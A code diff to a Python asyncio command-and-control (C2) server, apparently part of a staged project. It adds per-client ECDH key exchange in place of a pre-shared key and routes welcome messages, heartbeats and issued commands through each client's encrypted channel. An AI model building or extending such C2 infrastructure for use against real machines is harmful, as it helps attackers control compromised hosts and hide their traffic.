@@ -28,11 +28,12 @@ class ClientConnection:
     """Represents a connected client"""
 
     def __init__(self, client_id: str, reader: asyncio.StreamReader,
-                 writer: asyncio.StreamWriter, address: tuple):
+                 writer: asyncio.StreamWriter, address: tuple, protocol: ProtocolHandler):
         self.client_id = client_id
         self.reader = reader
         self.writer = writer
         self.address = address
+        self.protocol = protocol
         self.connected_at = datetime.now()
         self.last_heartbeat = datetime.now()
         self.is_alive = True
@@ -55,23 +56,25 @@ class ClientConnection:
 class C2Server:
     """Main C2 Server class"""
 
-    def __init__(self, host: str, port: int, encryption_key: Optional[bytes] = None):
+    def __init__(self, host: str, port: int, encryption_key: Optional[bytes] = None, use_ecdh: bool = True):
         """
         Initialize C2 Server
 
         Args:
             host: Server bind address
             port: Server listen port
-            encryption_key: Optional encryption key for secure communication
+            encryption_key: Optional encryption key for secure communication (PSK mode)
+            use_ecdh: If True, use ECDH key exchange instead of PSK
         """
         self.host = host
         self.port = port
-        self.protocol = ProtocolHandler(encryption_key)
+        self.use_ecdh = use_ecdh
+        self.encryption_key = encryption_key
         self.clients: Dict[str, ClientConnection] = {}
         self.server: Optional[asyncio.Server] = None
         self.db_logger = None  # Will be set in Step 3
         self.cli = None  # Will be set by CLI for prompt refresh
-        logger.info(f"C2 Server initialized (encryption: {encryption_key is not None})")
+        logger.info(f"C2 Server initialized (encryption mode: {'ECDH' if use_ecdh else 'PSK' if encryption_key else 'None'})")
 
     def set_db_logger(self, db_logger) -> None:
         """Set database logger (Dependency Injection for Step 3)"""
@@ -89,23 +92,47 @@ class C2Server:
         address = writer.get_extra_info('peername')
         client_id = str(uuid.uuid4())
 
-        client = ClientConnection(client_id, reader, writer, address)
-        self.clients[client_id] = client
-
-        logger.info(f"New client connected: {client_id} from {address}")
-        print(f"[New client connected: {client_id}]")
-
-        # Reprint prompt
-        if self.cli:
-            self.cli.reprint_prompt()
-
-        # Log to database if available
-        if self.db_logger:
-            await self.db_logger.log_event("client_connected", client_id, address)
+        # Create protocol handler for this client
+        if self.use_ecdh:
+            protocol = ProtocolHandler(use_ecdh=True)
+        else:
+            protocol = ProtocolHandler(self.encryption_key)
 
         try:
+            # Perform ECDH key exchange if enabled
+            if self.use_ecdh:
+                # Send server's public key
+                server_pubkey = protocol.get_public_key_bytes()
+                writer.write(server_pubkey)
+                await writer.drain()
+
+                # Receive client's public key (32 bytes)
+                client_pubkey = await reader.read(32)
+                if len(client_pubkey) != 32:
+                    logger.error(f"Invalid public key from client {client_id}")
+                    return
+
+                # Derive shared encryption key
+                protocol.derive_shared_key(client_pubkey)
+                logger.info(f"ECDH key exchange completed with client {client_id}")
+
+            # Create client connection object and register it
+            client = ClientConnection(client_id, reader, writer, address, protocol)
+            self.clients[client_id] = client
+
+            logger.info(f"New client connected: {client_id} from {address}")
+            print(f"[New client connected: {client_id}]")
+
+            # Reprint prompt
+            if self.cli:
+                self.cli.reprint_prompt()
+
+            # Log to database if available
+            if self.db_logger:
+                await self.db_logger.log_event("client_connected", client_id, address)
+
             # Send welcome message with client ID
-            await self.protocol.write_message(writer, {
+            await protocol.write_message(writer, {
                 "type": "welcome",
                 "client_id": client_id,
                 "message": "Connected to C2 Server"
@@ -113,7 +140,7 @@ class C2Server:
 
             # Handle client messages
             while True:
-                message = await self.protocol.read_message(reader)
+                message = await protocol.read_message(reader)
 
                 if message is None:
                     logger.info(f"Client {client_id} disconnected")
@@ -172,7 +199,7 @@ class C2Server:
                 )
 
             # Send acknowledgment
-            await self.protocol.write_message(client.writer, {
+            await client.protocol.write_message(client.writer, {
                 "type": "heartbeat_ack"
             })
 
@@ -234,7 +261,7 @@ class C2Server:
         }
 
         try:
-            await self.protocol.write_message(client.writer, message)
+            await client.protocol.write_message(client.writer, message)
             logger.info(f"Sent command {command_id} to {client_id}: {command_type}")
 
             # Log to database if available
